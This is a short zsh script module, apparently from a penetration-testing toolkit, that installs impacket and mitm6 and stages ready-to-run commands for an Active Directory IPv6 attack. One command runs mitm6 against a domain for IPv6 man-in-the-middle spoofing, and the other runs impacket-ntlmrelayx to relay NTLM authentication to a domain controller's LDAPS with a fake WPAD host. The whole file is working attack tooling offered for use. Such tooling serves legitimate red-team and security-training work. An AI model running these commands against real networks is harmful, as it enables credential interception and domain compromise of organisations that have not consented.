#!/usr/bin/env zsh

############################################################# 
# nb-ad-ipv6
#############################################################
nb-ad-ipv6-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-ipv6
------------
The nb-ad-ipv6 namespace contains commands for 

Commands
--------
nb-ad-ipv6-install         installs dependencies
nb-ad-ipv6-ntlmrelayx      set up ntlm relay
nb-ad-ipv6-mitm6           set up man in the middle for ipv6

DOC
}

nb-ad-ipv6-install() {
    __info "Running $0..."
    __pkgs impacket mitm6
}

nb-ad-ipv6-ntlmrelayx() {
    __check-project
	  __check-domain
	  __ask "Enter the IP address of the target DC server"
	  nb-vars-set-rhost

    print -z "impacket-ntlmrelayx -6 -t ldaps://${__RHOST} -wh fakewpad.${__DOMAIN} -l $(__domadpath)/ntlmrelayx"
}

nb-ad-ipv6-mitm6() {
    __check-project
	  __check-domain

    print -z "sudo mitm6 -d ${__DOMAIN} | tee -a $(__netadpath)/cme-sweep.txt"
}
